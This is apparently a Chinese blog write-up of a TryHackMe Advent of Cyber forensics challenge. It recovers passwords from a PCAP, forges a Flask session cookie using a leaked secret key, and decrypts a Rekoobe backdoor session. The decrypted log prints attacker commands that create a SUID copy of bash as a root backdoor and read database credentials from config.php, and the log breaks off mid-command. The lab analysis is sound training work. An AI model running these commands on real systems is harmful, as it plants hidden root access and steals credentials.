<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM L1 Operation Tiny Frostbite | Borgeousのblog</title><meta name="author" content="hack_Borgeous"><meta name="copyright" content="hack_Borgeous"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="题目背景“By the time you read this, you’ve already been attacked. I’m in your machine and you won’t get it back. You must be aware that the more you delay, the more information will be stolen away. Your S">
<meta property="og:type" content="article">
<meta property="og:title" content="THM L1 Operation Tiny Frostbite">
<meta property="og:url" content="http://www.hackborgeous.top/post/7f542627.html">
<meta property="og:site_name" content="Borgeousのblog">
<meta property="og:description" content="题目背景“By the time you read this, you’ve already been attacked. I’m in your machine and you won’t get it back. You must be aware that the more you delay, the more information will be stolen away. Your S">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.hackborgeous.top/img/top_img56.png">
<meta property="article:published_time" content="2024-12-02T12:25:46.000Z">
<meta property="article:modified_time" content="2024-12-16T14:01:30.969Z">
<meta property="article:author" content="hack_Borgeous">
<meta property="article:tag" content="应急响应">
<meta property="article:tag" content="溯源">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.hackborgeous.top/img/top_img56.png"><link rel="shortcut icon" href="/img/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8.png"><link rel="canonical" href="http://www.hackborgeous.top/post/7f542627.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: hack_Borgeous","link":"链接: ","source":"来源: Borgeousのblog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'THM L1 Operation Tiny Frostbite',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-12-16 22:01:30'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" href="/css/bilibiliBanner.css"  media="defer" onload="this.media='screen'"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/loading-bar.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/categoryBar/categoryBar.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/lazyload.gif" data-original="/img/AVAtar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">138</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">57</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博客文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments-o"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fas fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/top_img56.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Borgeousのblog"><span class="site-name">Borgeousのblog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博客文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments-o"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fas fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM L1 Operation Tiny Frostbite</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-02T12:25:46.000Z" title="发表于 2024-12-02 20:25:46">2024-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-16T14:01:30.969Z" title="更新于 2024-12-16 22:01:30">2024-12-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/tryhackme/">tryhackme</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM L1 Operation Tiny Frostbite"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h1><p><em>“By the time you read this, you’ve already been attacked. I’m in your machine and you won’t get it back. You must be aware that the more you delay, the more information will be stolen away. Your SOC is so weak, I’ll lend them a hand. Here’s a PCAP of the attack, you can’t beat this band! If your machine you want to recover, the password I stole you’ll need to discover.”</em></p>
<p>The first of our enemies is the <strong>Frostbite Fox</strong>. Known for being the slyest of them all. She’s made her way into McSkidy’s machine. Luckily for us, our great SOC detected it all in time. While the team focuses on securing the machine, you are tasked with recovering the password the Fox stole, so we can get McSkidy’s data back. </p>
<p><strong>Note:</strong> To attempt this challenge you will need to find the L1 Keycard in the main <a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/adventofcyber2024">Advent of Cyber room</a> challenges. The password in the keycard will allow you to open the ZIP file, which you can download from <code>http://MACHINE_IP/aoc_sq_1.zip</code>. The zip file is safe to download with MD5 of 044a78a6a1573c562bc18cefb761a578. In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, and not on your host OS. The keycard will be hidden between days 1 and 4.</p>
<p>这道题首先有一个压缩包，我们下载下来后需要找到密码，由题目提示信息我们知道，要想找到我们的密码，就得在主房间中找到一个key，当拿到key之后，我们才可以解压压缩包，所以我们的第一个任务就是去找key</p>
<h1 id="L1-keycard"><a href="#L1-keycard" class="headerlink" title="L1 keycard"></a>L1 keycard</h1><p>当我们在完成主房间的任务的时候，我们发现了下面的提示信息</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202203636047.png" alt="image-20241202203636047"></p>
<p>就是让我们在github的仓库上看看能不能找到更多的信息，我们在做主线任务的时候发现了一个仓库</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202204410419.png" alt="image-20241202204410419"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&quot;@09JKD0934jd712?djD&quot;</span></span><br><span class="line"></span><br><span class="line">ADMIN_USERNAME = <span class="string">&quot;admin&quot;</span>           </span><br><span class="line">ADMIN_PASSWORD = <span class="string">&quot;securepassword&quot;</span> <span class="comment">#CHANGE ME!!!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;logged_in&quot;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == ADMIN_USERNAME <span class="keyword">and</span> password == ADMIN_PASSWORD:</span><br><span class="line">            session[<span class="string">&quot;logged_in&quot;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;Invalid credentials!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/dashboard&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;logged_in&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;dashboard.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/data&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;logged_in&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;data.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&quot;logged_in&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
<p>里面有一个app.py，上面写了账号和密码，我们第一个想法就是去访问这个页面，看看能不能利用这个账号登陆进去，但是我们发现原账号密码已经被改掉了，我们可以尝试在自己本地起一个服务，然后用获取到的Cookie伪造管理员身份登陆进去，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202204737775.png" alt="image-20241202204737775"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202204817489.png" alt="image-20241202204817489"></p>
<p>之后我们访问data界面，出现如下界面</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202204901475.png" alt="image-20241202204901475"></p>
<p>我们成功找到我们的L1keycard</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/ad60cef872edd478daa959050f49b1ba.png" alt="ad60cef872edd478daa959050f49b1ba"></p>
<p>那一串字符就是我们压缩包的解压密码，我们拿去给压缩包解压就可以了，我们解压出来后得到一个流量包，接下来就是利用流量分析进行下面的解答</p>
<h1 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h1><p>这一题要找hacker用来注册的密码，那么很显然就是找POST流量包，因为我们的注册是通过POST来进行注册的，我们直接在过滤器里面输入<code>http.request.method == &quot;POST&quot;</code></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b25236b77bd4680bd6f2b67089fea821.png" alt="b25236b77bd4680bd6f2b67089fea821"></p>
<p>我们很容易就可以定位到这个流量包，右键追踪流即可</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b6dd16d958aeb06c772c085138f69dd1.png" alt="b6dd16d958aeb06c772c085138f69dd1"></p>
<p>这里我们成功找到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QU9DMjAyNHtUaW55X1R</span><br></pre></td></tr></table></figure>
<h1 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h1><p>第二问要我们找到攻击者所获取的密码，因为攻击者获取了管理员的密码后，必然会进行登陆操作，所以我们只需要查看登陆的流量包即可，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b12d55df51f5a17b8484c8f52a256bfd.png" alt="b12d55df51f5a17b8484c8f52a256bfd"></p>
<p>攻击者进行了管理员登陆，这个密码必然是获取的管理员密码，我们同样右键追踪流即可</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/953df9e808ae1cfd9d472d613eceb625.png" alt="953df9e808ae1cfd9d472d613eceb625"></p>
<p>所以本题的答案是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pbnlfVGlueV9TaDNsbF</span><br></pre></td></tr></table></figure>
<h1 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">What is the password of the zip file transferred by the attacker?</span><br><span class="line">黑客传输的zip的密码？</span><br></pre></td></tr></table></figure>
<p>第三问和第四问难度激增，可以说是非常难，我们首先继续看http流量</p>
<p>我们可以看到攻击者以管理员登陆后进行了从远程服务器下载操作，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202210304936.png" alt="image-20241202210304936"></p>
<p>我们重点关注这个ff文件，右键追踪流，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202210352986.png" alt="image-20241202210352986"></p>
<p>我们可以发现获取了一个可执行文件，这个文件是一个elf文件，我们把他导出来试试，我们先以原始数据全部导出，导出为<code>elf</code>文件，然后删除请求头就可以了，得到<code>download.elf</code>文件</p>
<p>我们首先丢微步去检测一下</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202211251417.png" alt="image-20241202211251417"></p>
<p>我们发现这是个<code>rekoobe</code>木马，通过资料查询后，我们知道这个木马是通过ssh来进行命令执行的，我们在网上也可以找到解密脚本，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202211719323.png" alt="image-20241202211719323"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/alexander-utkov/rekobee-analyzer</span><br></pre></td></tr></table></figure>
<p>我们把他下载下来去解密流量即可</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202212154339.png" alt="image-20241202212154339"></p>
<p>我们发现还需要一个<code>-s</code>的密钥参数，这个我们对elf文件进行逆向分析就可以找到，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b4833b5147ea33b6027189fc19b7d4cc.png" alt="b4833b5147ea33b6027189fc19b7d4cc"></p>
<p>我们在主函数中可以找到密钥，<code>SuP3RSeCrEt</code>，接下来我们直接进行解密就好了，由于我们的攻击者进行攻击是在获得我们的ff文件之后进行的，所以我们只需要对之后的流量进行解密，否则流量太大，需要运行很久才能拿到结果，我们先进行导出</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c5ad3e6c78b579f6f26a52acd14e9ae7.png" alt="c5ad3e6c78b579f6f26a52acd14e9ae7"></p>
<p>我们导出这之后的流量即可</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202213357628.png" alt="image-20241202213357628"></p>
<p>然后我们直接运行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python analyze.py -c out.pcapng -s SuP3RSeCrEt -vv</span><br></pre></td></tr></table></figure>
<p>在运行过程中我们爆出了如下错误</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202215058440.png" alt="image-20241202215058440"></p>
<p>问题出在pyshark上，我们去修改一下pyshark就可以了</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/77e413876acb3bf548cb14ca11b5f6ad.png" alt="77e413876acb3bf548cb14ca11b5f6ad"></p>
<p>经过多次调试，我们这里终于跑通了，如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@database:/tmp# cp /bin/bash /bin/pkexeccc</span><br><span class="line">→ root@database:/tmp# chmod u+s /bin/pkexeccc</span><br><span class="line">→ root@database:/tmp# md5sum /bin/pkexeccc</span><br><span class="line">→ 7063c3930affe123baecd3b340f1ad2c  /bin/pkexeccc</span><br><span class="line">→ root@database:/tmp# md5sum /bin/bash</span><br><span class="line">→ 7063c3930affe123baecd3b340f1ad2c  /bin/bash</span><br><span class="line">→ root@database:/tmp# ls -l /bin/pkexeccc</span><br><span class="line">→ -rwsr-xr-x 1 root root 1183448 Nov 13 00:06 /bin/pkexeccc</span><br><span class="line">→ root@database:/tmp# ls -la /var/www/html/</span><br><span class="line">→ total 652</span><br><span class="line">→ drwxr-xr-x 3 root root   4096 Nov 12 23:24 .</span><br><span class="line">→ drwxr-xr-x 3 root root   4096 Mar 15  2022 ..</span><br><span class="line">→ drwxr-x--x 2 root root   4096 Nov 12 23:28 admin</span><br><span class="line">→ -rw-r--r-- 1 root root 609097 Nov 12 23:15 bg.png</span><br><span class="line">→ -rw-r--r-- 1 root root    494 Nov 12 22:47 config.php</span><br><span class="line">→ -rw-r--r-- 1 root root   5479 Nov 12 23:19 index.php</span><br><span class="line">→ -rw-r--r-- 1 root root    223 Mar 15  2022 logout.php</span><br><span class="line">→ -rw-r--r-- 1 root root   5338 Nov 12 23:21 register.php</span><br><span class="line">→ -rw-r--r-- 1 root root   4191 Nov 12 23:24 reset-password.php</span><br><span class="line">→ -rw-r--r-- 1 root root   8644 Nov 12 23:24 welcome.php</span><br><span class="line">→ root@database:/tmp# cat /var/www/html/config.php</span><br><span class="line">→ &lt;?php</span><br><span class="line">→ /* Database credentials. Assuming you are running MySQL</span><br><span class="line">→ server with default setting (user &#x27;root&#x27; with no password) */</span><br><span class="line">→ define(&#x27;DB_SERVER&#x27;, &#x27;localhost&#x27;);</span><br><span class="line">→ define(&#x27;DB_USERNAME&#x27;, &#x27;mcskidy&#x27;);</span><br><span class="line">→ define(&#x27;DB_PASSWORD&#x27;, &#x27;aBT4ZfhteNRE3ah&#x27;);</span><br><span class="line">→ define(&#x27;DB_NAME&#x27;, &#x27;website&#x27;);</span><br><span class="line">→ </span><br><span class="line">→ /* Attempt to connect to MySQL database */</span><br><span class="line">→ $mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line">→ </span><br><span class="line">→ // Check connection</span><br><span class="line">→ if($mysqli === false)&#123;</span><br><span class="line">→         die(&quot;ERROR: Could not connect. &quot; . $mysqli-&gt;connect_error);</span><br><span class="line">→ &#125;</span><br><span class="line">→ ?&gt;</span><br><span class="line">→ </span><br><span class="line">→ root@database:/tmp# mysql -h localhost -u mcskidy -p&#x27;aBT4ZfhteNRE3ah&#x27; -e &#x27;show databases;&#x27;</span><br><span class="line">→ mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">→ +--------------------+</span><br><span class="line">→ | Database           |</span><br><span class="line">→ +--------------------+</span><br><span class="line">→ | elves              |</span><br><span class="line">→ | information_schema |</span><br><span class="line">→ | website            |</span><br><span class="line">→ +--------------------+</span><br><span class="line">→ root@database:/tmp# mysql -h localhost -D elves -u mcskidy -p&#x27;aBT4ZfhteNRE3ah&#x27; -e 